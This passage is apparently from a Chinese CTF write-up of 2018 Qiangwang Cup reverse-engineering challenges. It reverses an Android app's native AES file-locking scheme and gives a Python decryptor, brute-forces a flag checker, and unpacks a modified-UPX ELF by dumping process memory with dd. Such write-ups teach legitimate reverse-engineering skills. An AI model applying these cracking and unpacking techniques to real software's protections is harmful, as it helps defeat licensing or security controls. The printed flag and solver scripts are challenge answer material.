<li>将加密后的文件保存为<code>.lock</code>格式</li>
<li>显示已加密的文件列表</li>
</ol>
<p><strong>目标是将某个加密后的文件解密出来，flag 就在里面。</strong></p>
<h3 id="mainactivity分析"><a href="#mainactivity分析" class="headerlink" title="mainactivity分析"></a>mainactivity分析</h3><p>直接找到点击事件ENCRYPT按钮绑定的OnClick()方法:</p>
<style>.juownvjvqjyo{zoom:80%;}</style><img src="/2018/11/16/qwb2018-re/image-20250826215213134.png" class="juownvjvqjyo" alt="image-20250826215213134">

<p>可以看出，代码首先检查了文件读写的权限，然后打开了图片选择的界面，选择图片后，会调用方法onActivityResult()：</p>
<style>.zlojlqokjmbb{}</style><img src="/2018/11/16/qwb2018-re/image-20250826215307964.png" class="zlojlqokjmbb" alt="image-20250826215307964">

<p>可以看到这里有3个方法被调用了，分别是enc()，j()，i()。</p>
<style>.tbztkeqxmpxe{}</style><img src="/2018/11/16/qwb2018-re/image-20250826215346430.png" class="tbztkeqxmpxe" alt="image-20250826215346430">

<p>可以看出i()使用来显示文本框中的内容，对图片的处理没有影响</p>
<style>.vlykqgojcwxp{}</style><img src="/2018/11/16/qwb2018-re/image-20250826215409020.png" class="vlykqgojcwxp" alt="image-20250826215409020">

<p>j()用于获取apk签名的MD5值</p>
<style>.kalyyejleoxr{}</style><img src="/2018/11/16/qwb2018-re/image-20250826215441073.png" class="kalyyejleoxr" alt="image-20250826215441073">

<p>根据enc()方法的声明，可以知道，方法需要三个String类型的参数，这三个参数具体是什么，我们用动态调试的方法获取。</p>
<hr>
<h3 id="动态调试-so文件"><a href="#动态调试-so文件" class="headerlink" title="动态调试.so文件"></a>动态调试.so文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push &quot;%USERPROFILE%\Downloads\bootloader-bonito-b4s4-0.4-8048689.img&quot; /sdcard/Download/</span><br><span class="line">#查看文件列表</span><br><span class="line">adb shell ls -la /sdcard/Download/</span><br></pre></td></tr></table></figure>

<p>root： <a target="_blank" rel="noopener" href="https://sspai.com/post/76276">https://sspai.com/post/76276</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000 ; Options     : EF_ARM_SOFT_FLOAT</span><br><span class="line">LOAD:00000000 ; EABI version: 5</span><br><span class="line">LOAD:00000000 ;</span><br><span class="line">LOAD:00000000</span><br><span class="line">LOAD:00000000 ; Processor       : ARM</span><br><span class="line">LOAD:00000000 ; ARM architecture: ARMv7</span><br><span class="line">LOAD:00000000 ; Target assembler: Generic assembler for ARM</span><br><span class="line">LOAD:00000000 ; Byte sex        : Little endian</span><br><span class="line"></span><br><span class="line">LOAD:00000000 ; Segment type: Pure code</span><br><span class="line">LOAD:00000000                 AREA LOAD, CODE, ALIGN=12</span><br><span class="line">LOAD:00000000                 CODE32</span><br></pre></td></tr></table></figure>

<p><strong>IDA PRO连接调试应用</strong><br>(1)在IDA Pro的安装路径dbgsrv目录下找到android_server，放入真机的&#x2F;data&#x2F;local&#x2F;tmp路径下并赋权，以root身份运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">adb push android_server /data/local/tmp </span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd /data/local/tmp</span><br><span class="line">chmod 755 android_server64</span><br><span class="line">./android_server64</span><br></pre></td></tr></table></figure>

<style>.ochpydnyhnyl{}</style><img src="/2018/11/16/qwb2018-re/image-20250827095440764.png" class="ochpydnyhnyl" alt="image-20250827095440764">

<p>(2)转发窗口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946  </span><br></pre></td></tr></table></figure>

<style>.nvuopslifskt{}</style><img src="/2018/11/16/qwb2018-re/image-20250827100132266.png" class="nvuopslifskt" alt="image-20250827100132266">

<p>打开ida32位</p>
<p>Deubugger-Attach-Remote ARM Linux&#x2F;Android debugger</p>
<p>查看libnative.so是否已经运行，打开enc()函数。下断点。</p>
<style>.yeirdtycyohg{}</style><img src="/2018/11/16/qwb2018-re/image-20250904101123407.png" class="yeirdtycyohg" alt="image-20250904101123407">

<p>打开app-选择照片-手机黑屏-断到了</p>
<hr>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>静态看吧，主要就是这个enc()。native方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall Java_com_a_sample_picturelock_MainActivity_enc(int a1, int a2, int a3, int a4, int a5)</span><br><span class="line">&#123;</span><br><span class="line">  char *v8; // r4</span><br><span class="line">  int v9; // r6</span><br><span class="line">  const void *v10; // r11</span><br><span class="line"></span><br><span class="line">  v8 = (char *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a3, 0);</span><br><span class="line">  v9 = (*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a4, 0);</span><br><span class="line">  if ( !dword_600C )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_600C = (int)malloc(0x20u);</span><br><span class="line">    v10 = (const void *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a5, 0);</span><br><span class="line">    qmemcpy((void *)dword_600C, v10, 0x20u);</span><br><span class="line">    (*(void (__fastcall **)(int, int, const void *))(*(_DWORD *)a1 + 680))(a1, a5, v10);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_1A48(v8);</span><br><span class="line">  (*(void (__fastcall **)(int, int, char *))(*(_DWORD *)a1 + 680))(a1, a3, v8);</span><br><span class="line">  return (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 680))(a1, a4, v9);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_1A48函数：一些加密算法</p>
<p>此函数是一个典型的<strong>文件加解密&#x2F;转换工具</strong>的核心逻辑，主要功能为：</p>
<ul>
<li><strong>初始化阶段</strong>：首次调用时生成内部状态（疑似密钥调度或预处理）。</li>
<li><strong>文件处理阶段</strong>：从输入文件 <code>filename</code> 读取数据 → 经复杂变换 → 写入输出文件 <code>a2</code></li>
</ul>
<p>基本流程：</p>
<ol>
<li>将传入的签名的 md5 字符串分为两半，生成两组密钥。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v5 = dword_600C;</span><br><span class="line">    for ( i = 0; i != 4; ++i )</span><br><span class="line">      v4[i] = _byteswap_ulong(*(_DWORD *)(v5 + i * 4));</span><br><span class="line">      </span><br><span class="line">v29 = &amp;dword_6008;</span><br><span class="line">if ( (v24 &amp; 1) == 0 )</span><br><span class="line">	v29 = &amp;dword_6004;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>每次读入 md5sig[k &amp; 0x1F] 大小的内容</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v24 = *(_BYTE *)(dword_600C + (k &amp; 0x1F));</span><br></pre></td></tr></table></figure>

<ul>
<li><code>k &amp; 0x1F</code> 等价于 <code>k % 32</code>，即循环使用 <code>dword_600C</code> 的前 32 字节作为每轮读取长度表。</li>
</ul>
<p><code>fread(v20, 1u, v24, v21)</code> 按此长度读取数据。</p>
<ol start="3">
<li>根据读入的大小决定使用哪一组密钥</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ((v24 &amp; 1) == 0) v29 = &amp;dword_6004;</span><br></pre></td></tr></table></figure>

<ul>
<li>根据当前块长度 <code>v24</code> 的奇偶性选择 IV 基址（<code>dword_6004</code> 或 <code>dword_6008</code>）。</li>
</ul>
<ol start="4">
<li>奇数使用第二组密钥，偶数使用第一组密钥</li>
</ol>
<ul>
<li>当 <code>v24</code> 为奇数时，<code>(v24 &amp; 1) != 0</code>，默认使用 <code>dword_6008</code>；</li>
<li>当 <code>v24</code> 为偶数时，强制切换为 <code>dword_6004</code>。</li>
</ul>
<ol start="5">
<li>如果读入的大小不够 16 的话，就将后面填充为不够的大小（比如大小为 12 时，填充 4 个 0x4）</li>
</ol>
<ul>
<li><code>if (v25 &lt;= 0xF)</code> 触发填充逻辑；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memset(v27, (unsigned __int8)v28, 16 - (v26 &amp; 0xF));</span><br></pre></td></tr></table></figure>

<ul>
<li>填充值为 <code>v28 = 16 - (v26 &amp; 0xF)</code>，即填充长度本身。</li>
</ul>
<ol start="6">
<li>这时修改后的内容必然够 16 个字节，对前 16 个字节进行 AES 加密。对于后面的字节，将其与 md5sig[k &amp; 0x1F] 依次进行异或。</li>
</ol>
<ul>
<li><strong>前 16 字节</strong>：经过复杂的多轮变换（<code>sub_132C</code>, <code>sub_13B0</code> 等），最终写入 <code>v22</code> 的前 16 字节。</li>
<li><strong>后续字节</strong>：<code>if (v26 &gt;= 0x11)</code> 分支中，对超出 16 字节的部分执行 <code>v22[v31] = v20[v31] ^ (BYTE)(v32 + v31%32)</code>，即与 <code>dword_600C</code> 的循环值异或。</li>
</ul>
<p>使用keytool工具获取签名的 md5</p>
<p>android中关于keytool 错误：java.lang.Exception：密钥库文件不存在: 解决步骤_keytool 错误: java.lang.exception: 密钥库文件不存在: debug.k-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/y201314an/article/details/80994798">https://blog.csdn.net/y201314an/article/details/80994798</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#keytool -printcert -jarfile D:\CTF\2018reverse\picturelock\picturelock.apk</span><br><span class="line"></span><br><span class="line">签名者 #1:</span><br><span class="line"></span><br><span class="line">证书 #1：</span><br><span class="line">所有者: CN=a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">发布者: CN=a, OU=b, O=c, L=d, ST=e, C=ff</span><br><span class="line">序列号: 5f4e6be1</span><br><span class="line">生效时间: Fri Sep 09 14:32:36 CST 2016, 失效时间: Tue Sep 03 14:32:36 CST 2041</span><br><span class="line">证书指纹:</span><br><span class="line">         SHA1: 48:E7:04:5E:E6:0D:9D:8A:25:7C:52:75:E3:65:06:09:A5:CC:A1:3E</span><br><span class="line">         SHA256: BA:12:C1:3F:D6:0E:0D:EF:17:AE:3A:EE:4E:6A:81:67:82:D0:36:7F:F0:2E:37:CC:AD:5D:6E:86:87:0C:8E:38</span><br><span class="line">签名算法名称: SHA256withRSA</span><br><span class="line">主体公共密钥算法: 2048 位 RSA 密钥</span><br><span class="line">版本: 3</span><br><span class="line"></span><br><span class="line">扩展:</span><br><span class="line"></span><br><span class="line">#1: ObjectId: 2.5.29.14 Criticality=false</span><br><span class="line">SubjectKeyIdentifier [</span><br><span class="line">KeyIdentifier [</span><br><span class="line">0000: 71 A3 2A FB D3 F4 A9 A9   2A 74 3F 29 8E 67 8A EA  q.*.....*t?).g..</span><br><span class="line">0010: 3B DD 30 E3                                        ;.0.</span><br><span class="line">]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>获取md5需要openssl，太大了下不下来啊。</p>
<p>反正MD5:  F8:C4:90:56:E4:CC:F9:A1:1E:09:0E:AF:47:1F:41:8D</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import itertools</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">sig = b&#x27;f8c49056e4ccf9a11e090eaf471f418d&#x27;</span><br><span class="line"></span><br><span class="line">def decode_sig(payload):</span><br><span class="line">    ans = bytearray()  # 使用 bytearray 代替字符串</span><br><span class="line">    for i in range(len(payload)):</span><br><span class="line">        # 执行异或操作并直接追加字节</span><br><span class="line">        ans.append(payload[i] ^ sig[(16 + i) % 32])</span><br><span class="line">    return bytes(ans)  # 转换为不可变 bytes 类型</span><br><span class="line"></span><br><span class="line">def dec_aes():</span><br><span class="line">    with open(&#x27;flag.jpg.lock&#x27;, &#x27;rb&#x27;) as data_file:</span><br><span class="line">        data = data_file.read()</span><br><span class="line">    </span><br><span class="line">    with open(&#x27;flag.jpg&#x27;, &#x27;wb&#x27;) as f:  # 确保文件以二进制模式打开</span><br><span class="line">        idx = 0</span><br><span class="line">        i = 0</span><br><span class="line">        cipher1 = AES.new(sig[:0x10], AES.MODE_ECB)</span><br><span class="line">        cipher2 = AES.new(sig[0x10:], AES.MODE_ECB)</span><br><span class="line">        </span><br><span class="line">        while idx &lt; len(data):</span><br><span class="line">            read_len = sig[i % 32]</span><br><span class="line">            payload = data[idx:idx + read_len]</span><br><span class="line">            print(f&#x27;[+] Totally &#123;idx&#125; / &#123;len(data)&#125; bytes, sig index : &#123;i&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">            if read_len % 2 == 0:</span><br><span class="line">                f.write(cipher1.decrypt(payload[:0x10]))</span><br><span class="line">            else:</span><br><span class="line">                f.write(cipher2.decrypt(payload[:0x10]))</span><br><span class="line">            </span><br><span class="line">            # 关键修改：decode_sig 现在返回 bytes，可直接写入二进制文件</span><br><span class="line">            f.write(decode_sig(payload[16:]))</span><br><span class="line">            f.flush()</span><br><span class="line">            idx += read_len</span><br><span class="line">            i += 1</span><br><span class="line">        print(&#x27;[+] Decoding done ...&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    dec_aes()</span><br></pre></td></tr></table></figure>

<p>得到解密出来的flag.jpg</p>
<style>.ikmrsrvtvlrg{zoom: 33%;}</style><img src="/2018/11/16/qwb2018-re/flag.jpg" class="ikmrsrvtvlrg" alt="flag">

<h3 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a><strong>补充知识点</strong></h3><p>smali</p>
<p>smali是andriod虚拟机的反汇编语言</p>
<p>openssl x509 -noout -modulus -in client.crt | openssl md5<br>openssl rsa -noout -modulus -in client.key | openssl md5</p>
<h2 id="simple-check"><a href="#simple-check" class="headerlink" title="simple check"></a>simple check</h2><h3 id="simple的mainactivity-kt分析"><a href="#simple的mainactivity-kt分析" class="headerlink" title="simple的mainactivity.kt分析"></a>simple的mainactivity.kt分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.a.simplecheck;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import android.support.v7.app.c;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>包名</strong>：<code>com.a.simplecheck</code>，表明这是一个简单的检查类应用</li>
<li><strong>导入语句</strong>：使用了Android Support库（v7），说明这是一个较老的项目</li>
</ul>
<p>这是一个<strong>密码验证程序</strong>，其工作流程为：</p>
<ol>
<li>用户在一个文本输入框（EditText）中输入内容</li>
<li>点击一个按钮进行验证</li>
<li>程序调用<code>a.a(String)</code>方法对输入进行验证</li>
<li>根据验证结果显示不同的Toast消息</li>
</ol>
<p>关键逆向分析点：</p>
<ol>
<li><strong>核心逻辑在类<code>a</code>的方法<code>a()</code>中</strong></li>
<li><strong>验证算法</strong>：<code>a.a(String input)</code>是验证的核心方法</li>
<li><strong>成功条件</strong>：当输入满足某种算法时返回<code>true</code></li>
</ol>
<h3 id="类a分析"><a href="#类a分析" class="headerlink" title="类a分析"></a>类a分析</h3><p>这个 <code>a</code> 类包含了验证flag的完整算法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class a &#123;</span><br><span class="line">    private static int[] a = &#123;0, 146527998, 205327308, ... , 864054312&#125;;</span><br><span class="line">    private static int[] b = &#123;13710, 46393, 49151, ... , 37108&#125;;</span><br><span class="line">    private static int[] c = &#123;38129, 57355, 22538, ... , 64666&#125;;</span><br><span class="line">    private static int[] d = &#123;0, -341994984, -370404060, ... , 276158562&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义了4个静态数组，包含预计算的常数</li>
<li>数组 <code>a</code> 有35个元素，<code>b</code>、<code>c</code>、<code>d</code> 各有34个元素</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static boolean a(String str) &#123;</span><br><span class="line">    if (str.length() != b.length) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>第一重检查</strong>：输入字符串长度必须等于数组 <code>b</code> 的长度（34个字符）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int[] iArr = new int[a.length];</span><br><span class="line">iArr[0] = 0;</span><br><span class="line">int i = 1;</span><br><span class="line">for (byte b2 : str.getBytes()) &#123;</span><br><span class="line">    iArr[i] = b2;</span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>将输入字符串转换为ASCII码数组</li>
<li><code>iArr[0]</code> 被设为0，然后依次填充输入字符串的每个字符的ASCII值</li>
<li>最终 <code>iArr</code> 数组有35个元素（索引0到34）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (int i2 = 0; i2 &lt; c.length; i2++) &#123;</span><br><span class="line">    if (a[i2] != (b[i2] * iArr[i2] * iArr[i2]) + (c[i2] * iArr[i2]) + d[i2] </span><br><span class="line">        || a[i2 + 1] != (b[i2] * iArr[i2 + 1] * iArr[i2 + 1]) + (c[i2] * iArr[i2 + 1]) + d[i2]) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">return true;</span><br></pre></td></tr></table></figure>

<p>遍历34次，检查二次方程约束</p>
<p><strong>验证模型</strong></p>
<p>对于i从0到33，必须满足以下两个方程其中之一：</p>
<p>方程1：<br>$$<br>a[i] &#x3D; b[i] * (x_i)² + c[i] * x_i + d[i]<br>$$<br>方程2：<br>$$<br>a[i + 1] &#x3D; b[i] * (x_{i+1})² + c[i] * x_{i+1} + d[i]<br>$$</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>暴力破解就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]</span><br><span class="line">b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]</span><br><span class="line">c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]</span><br><span class="line">d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]</span><br><span class="line"></span><br><span class="line">result = [0]</span><br><span class="line"></span><br><span class="line">for i in range(34):</span><br><span class="line">    found = False</span><br><span class="line">    for char_code in range(32,127):</span><br><span class="line">        if a[i + 1] == b[i] * char_code * char_code + c[i] * char_code + d[i]:</span><br><span class="line">            result.append(char_code)</span><br><span class="line">            found = True</span><br><span class="line">            break</span><br><span class="line">        </span><br><span class="line">    if not found:</span><br><span class="line">        print(f&quot;在位置 &#123;i&#125; 找不到满足方程的字符&quot;)</span><br><span class="line">        break</span><br><span class="line">    </span><br><span class="line"># 将ASCII码转换为字符串</span><br><span class="line">flag = &#x27;&#x27;.join(chr(code) for code in result)</span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br><span class="line"></span><br><span class="line">#Flag: flag&#123;MAth_i&amp;_GOOd_DON7_90V_7hInK?&#125;</span><br></pre></td></tr></table></figure>



<p><strong>补充知识点</strong></p>
<p><strong>什么是 Toast？</strong></p>
<p><strong>Toast</strong> 是一个小的弹出消息框，它在屏幕底部短暂显示一段时间，然后自动消失。它用于向用户提供简单的反馈或提示信息。</p>
<h2 id="hide"><a href="#hide" class="headerlink" title="hide"></a>hide</h2><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-251371.htm">原创]从2018强网杯hide题中学习手动脱壳与算法识别的思路-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>先查壳，稍微折腾了一下，PEiD查不到壳，选择使用strings命令。windows下没有strings，下载git，git也不能用，最终选择MSYS2。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pacman -Syu</span><br><span class="line">pacman -S mingw-w64-x86_64-binutils</span><br><span class="line">cd /d/CTF/2018reverse/hide</span><br><span class="line">strings hide | grep -i upx</span><br></pre></td></tr></table></figure>

<p>查看结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ strings hide | grep -i upx</span><br><span class="line">UPX!</span><br><span class="line">$Info: This file is packed with the UPX executable packer http://upx.sf.net $</span><br><span class="line">$Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved. $</span><br><span class="line">UPX!</span><br><span class="line">UPX!</span><br></pre></td></tr></table></figure>

<p>这个文件 <strong><code>hide</code></strong> 使用了 <strong>UPX 3.91</strong> 版本进行加壳压缩。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS D:\CTF\2018reverse\hide&gt; upx -d hide</span><br><span class="line">                       Ultimate Packer for eXecutables</span><br><span class="line">                          Copyright (C) 1996 - 2025</span><br><span class="line">UPX 5.0.2       Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jul 20th 2025</span><br><span class="line"></span><br><span class="line">        File size         Ratio      Format      Name</span><br><span class="line">   --------------------   ------   -----------   -----------</span><br><span class="line">upx: hide: CantUnpackException: unknown format 0</span><br><span class="line"></span><br><span class="line">Unpacked 0 files.</span><br></pre></td></tr></table></figure>

<p>需要手动脱壳，使用file命令查看文件信息，是个Linux文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file hide</span><br><span class="line">hide: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header</span><br></pre></td></tr></table></figure>

<p>具体做法是让程序先运行，然后等到数据自动解压&#x2F;解密出来后，再dump内存组成elf文件进行分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;./hide</span><br><span class="line">&gt; pgrep -fl hide</span><br><span class="line">&gt; pmap -d 21895</span><br><span class="line">&gt; dd if=/proc/$(pidof hide)/mem of=hide_dump1 skip=4194304  bs=1c count=827392</span><br><span class="line"></span><br><span class="line">&gt; file hide_dump1</span><br><span class="line">hide_dump1: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, missing section headers at 840568</span><br><span class="line"></span><br><span class="line">&gt; dd if=/proc/$(pidof hide)/mem of=hide_dump2 skip=7110656 bs=1 count=20480</span><br><span class="line">&gt; cat hide_dump1 hide_dump2 &gt; hide_dump</span><br><span class="line"></span><br><span class="line">&gt; file hide_dump</span><br><span class="line">hide_dump: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, stripped</span><br></pre></td></tr></table></figure>

<p>然后就获得了完整的脱壳后的文件。</p>
<p>静态分析</p>
<p>将<code>hide_dump</code>载入ida，按下<code>Shift</code>+<code>F12</code>查看字符串列表并搜索<code>flag</code>:</p>
<style>.bxwfatepafzf{}</style><img src="/2018/11/16/qwb2018-re/image-20250911155632129.png" class="bxwfatepafzf" alt="image-20250911155632129">

<p>敏感字符串aYouAreRight，查看交叉引用：</p>
<style>.nrxesyunaoyt{zoom:67%;}</style><img src="/2018/11/16/qwb2018-re/image-20250911155911810.png" class="nrxesyunaoyt" alt="image-20250911155911810">

<p>查看sub_4009EF函数：</p>
<style>.puklxilfixjb{zoom:80%;}</style><img src="/2018/11/16/qwb2018-re/image-20250911161638344.png" class="puklxilfixjb" alt="image-20250911161638344">

<p>这肯定不对，看下一个函数：</p>
<p><img src="/image-20250911201625976.png" alt="image-20250911201625976"></p>
